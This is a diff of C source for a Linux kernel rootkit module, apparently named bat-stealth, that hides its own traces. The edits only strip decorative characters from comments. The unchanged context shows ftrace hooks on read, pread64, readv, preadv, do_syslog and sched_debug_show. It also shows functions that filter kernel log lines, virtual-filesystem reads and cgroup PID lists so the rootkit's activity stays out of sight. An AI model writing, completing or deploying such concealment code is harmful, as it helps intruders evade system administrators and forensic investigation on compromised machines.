@@ -1,4 +1,4 @@
-/* clear_taint_dmesg.c — Suppress bat-stealth evidence from dmesg/logs.
+/* clear_taint_dmesg.c   Suppress bat-stealth evidence from dmesg/logs.
  *
  * Hooks:
  *   - sys_read / sys_pread64 / sys_readv / sys_preadv:
@@ -8,7 +8,7 @@
  *   - do_syslog: Filter SYSLOG_ACTION_READ* responses
  *   - sched_debug_show: Filter /proc/sched_debug entries
  *
- * Port from Singularity — ARCH_SYS() + REGS_ARGn for portability.
+ * Port from Singularity   ARCH_SYS() + REGS_ARGn for portability.
  * External deps on hooks_write.c (saved_ftrace_value, ftrace_write_intercepted)
  * replaced with local stubs (hooks_write.c is out of scope for bat-stealth S2).
  */
@@ -36,7 +36,7 @@ static int (*orig_do_syslog)(int type, char __user *buf, int len, int source);
 /* Forward declaration */
 static notrace bool line_contains_sensitive_info(const char *line);
 
-/* ── File type predicates ─────────────────────────────────────────── */
+/*  File type predicates                                           */
 
 static const char *virtual_fs_types[] = {
     "proc", "procfs", "sysfs", "tracefs", "debugfs", NULL
@@ -169,7 +169,7 @@ static notrace bool should_filter_file(const char *filename)
             strcmp(filename, "touched_functions") == 0);
 }
 
-/* ── Line content predicates ─────────────────────────────────────── */
+/*  Line content predicates                                       */
 
 static notrace bool line_contains_sensitive_info(const char *line)
 {
@@ -238,7 +238,7 @@ static notrace bool line_contains_sensitive_info(const char *line)
     return false;
 }
 
-/* ── PID filtering from buffer (cgroup files, etc.) ─────────────── */
+/*  PID filtering from buffer (cgroup files, etc.)               */
 
 static notrace bool is_pid_in_buf(pid_t pid)
 {
@@ -322,7 +322,7 @@ static notrace ssize_t filter_cgroup_pids(char __user *user_buf, ssize_t bytes_r
     return filtered_len;
 }
 
-/* ── Buffer content filtering ─────────────────────────────────────── */
+/*  Buffer content filtering                                       */
 
 static notrace ssize_t filter_buffer_content(char __user *user_buf,
                                                ssize_t bytes_read)
@@ -476,7 +476,7 @@ static notrace ssize_t filter_kmsg_line(char __user *user_buf, ssize_t bytes_rea
     return ret;
 }
 
-/* ── Hook: sys_read ──────────────────────────────────────────────── */
+/*  Hook: sys_read                                                */
 
 static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs)
 {
@@ -490,7 +490,7 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs)
     if (!orig_read || !user_buf)
         return orig_read ? orig_read(regs) : -EINVAL;
 
-    /* Handle ftrace_enabled fake read (stubs — ftrace_write_intercepted always false) */
+    /* Handle ftrace_enabled fake read (stubs   ftrace_write_intercepted always false) */
     (void)count;
     (void)ftrace_write_intercepted;
     (void)saved_ftrace_value;
@@ -527,7 +527,7 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs)
     return res;
 }
 
-/* ── Hook: sys_pread64 ───────────────────────────────────────────── */
+/*  Hook: sys_pread64                                             */
 
 static notrace asmlinkage ssize_t hook_pread64(const struct pt_regs *regs)
 {
@@ -560,7 +560,7 @@ static notrace asmlinkage ssize_t hook_pread64(const struct pt_regs *regs)
     return res;
 }
 
-/* ── Hook: do_syslog (dmesg) ─────────────────────────────────────── */
+/*  Hook: do_syslog (dmesg)                                       */
 
 static notrace int hook_do_syslog(int type, char __user *buf, int len, int source)
 {
@@ -585,7 +585,7 @@ static notrace int hook_do_syslog(int type, char __user *buf, int len, int sourc
     return ret;
 }
 
-/* ── Hook: sched_debug_show ──────────────────────────────────────── */
+/*  Hook: sched_debug_show                                        */
 
 static notrace int hook_sched_debug_show(struct seq_file *m, void *v)
 {
@@ -594,7 +594,7 @@ static notrace int hook_sched_debug_show(struct seq_file *m, void *v)
     return orig_sched_debug_show ? orig_sched_debug_show(m, v) : 0;
 }
 
-/* ── Hook table ──────────────────────────────────────────────────── */
+/*  Hook table                                                    */
 
 static struct ftrace_hook hooks[] = {
     HOOK(ARCH_SYS("read"),           hook_read,           &orig_read),
@@ -603,23 +603,23 @@ static struct ftrace_hook hooks[] = {
     HOOK("sched_debug_show",         hook_sched_debug_show, &orig_sched_debug_show),
 };
 
-/* readv / preadv — optional, non-fatal if symbol missing */
+/* readv / preadv   optional, non-fatal if symbol missing */
 static struct ftrace_hook opt_hooks[] = {
     HOOK(ARCH_SYS("readv"),          hook_read,           &orig_readv),
     HOOK(ARCH_SYS("preadv"),         hook_pread64,        &orig_preadv),
 };
 
-/* ── Init / Exit ─────────────────────────────────────────────────── */
+/*  Init / Exit                                                   */
 
 int clear_taint_dmesg_init(void)
 {
     int i;
 
-    /* Core hooks — require read and pread64 */
+    /* Core hooks   require read and pread64 */
     if (fh_install_hooks(hooks, ARRAY_SIZE(hooks)) != 0)
         return -ENOENT;
 
-    /* Optional hooks — ignore failure */
+    /* Optional hooks   ignore failure */
     for (i = 0; i < (int)ARRAY_SIZE(opt_hooks); i++)
         fh_install_hook(&opt_hooks[i]);
 
